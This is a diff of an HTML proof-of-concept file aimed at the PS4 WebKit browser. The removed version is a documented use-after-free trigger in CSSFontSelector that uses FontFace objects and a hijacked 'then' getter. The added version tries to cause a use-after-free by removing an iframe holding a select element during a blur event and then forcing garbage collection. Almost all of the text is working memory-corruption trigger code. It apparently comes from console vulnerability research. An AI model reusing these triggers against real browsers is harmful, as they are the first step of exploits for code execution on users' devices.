@@ -1,52 +1,65 @@
-<!DOCTYPE html>
-<!--
-  UAF: CSSFontSelector via ctx.font setter + document.fonts.add()
-       Variante com 2 faces da mesma familia (como UAF_CSSFontSelector)
-  ================================================================
-  Bug class  : Use-After-Free (CWE-416)
-  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15
-  Trigger    : ctx.font = 'size FontName'
-  Victim C++ : CSSFontSelector â€” iterador invalido com 2 faces
-               da mesma familia forcando code path especifico
-
-  DIFERENCA DO POC-A:
-  -------------------
-  Duas faces com o MESMO nome de familia (T) sao adicionadas ao
-  document.fonts. Isso forca CSSFontSelector a iterar multiplas
-  entradas para a mesma familia, aumentando a janela de corrupcao
-  quando fonts.add() muta a colecao durante a iteracao.
-  Mesmo padrao do UAF_CSSFontSelector.html confirmado pela Sony,
-  com trigger ctx.font em vez de ctx.measureText().
-
-  CONFIRMADO: PS4 FW 14.00 â€” secao C V1 do diagnostico v4
--->
 <html>
-<body>
+<head>
 <script>
-function trigger() {
-    var face1 = new FontFace('T', 'local(Helvetica)');
-    var face2 = new FontFace('T', 'local(Helvetica)');
-    document.fonts.add(face1);
-    document.fonts.add(face2);
-    void face1.loaded;
-    void face2.loaded;
-
-    var fired = false;
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get: function() {
-            if (fired) return undefined;
-            fired = true;
-            document.fonts.add(new FontFace('U', 'local(Helvetica)'));
-            return undefined;
-        }
-    });
-
-    var c = document.createElement('canvas');
-    c.getContext('2d').font = '10px T';
+function forceGC() {
+    function gcRec(n) {
+          if (n < 1)
+              return {};
+          var temp = {i: "ab" + i + (i / 100000)};
+          temp += "foo";
+          gcRec(n-1);
+    }
+    for (var i = 0; i < 10000; i++)
+    gcRec(10);
 }
 
-window.onload = function() { setTimeout(trigger, 0); };
+async function magic() {
+  frame.remove();
+  document.body.innerHTML = '<p>Se você está vendo este texto, o select e o iframe foram removidos sem crash.</p>';
+  forceGC();
+}
+
+function test() {
+  var select = outerContainer.querySelector('select');
+  var input  = outerContainer.querySelector('input');  // ? sem depender de índice
+
+  if (!input) {
+    document.body.innerHTML = '<p>ERRO: input não encontrado no shadow DOM.</p>';
+    return;
+  }
+
+  input.addEventListener('blur', magic);
+  input.focus();
+
+  // Tenta acionar via access key sintético (pode ou não funcionar no PS4)
+  document.dispatchEvent(new KeyboardEvent('keydown', {
+    bubbles: true,
+    cancelable: true,
+    view: window,
+    key: 'a',
+    code: 'KeyA',
+    altKey: true,
+    keyIdentifier: 'U+0041'
+  }));
+
+  // Fallback: foca direto no select para acionar o blur?magic
+  if (document.activeElement !== select) {
+    select.focus();
+  }
+}
+</script>
+</head>
+<body onload="test()">
+<p>Teste: access key / select destroy no PS4</p>
+<script>
+  frame = document.body.appendChild(document.createElement('iframe'));
+  frame.style = 'width: 100%; height: 100%; border: 0';
+  outerContainer = frame.contentDocument.body.attachShadow({ mode: 'open' });
+  outerContainer.innerHTML = `<select accesskey="a"><option>SouthSea</option></select>
+<p>Made in the body</p>
+<input>`;
+  outerContainer.querySelector('input').addEventListener('blur', magic);
+  outerContainer.querySelector('input').focus();
 </script>
 </body>
 </html>
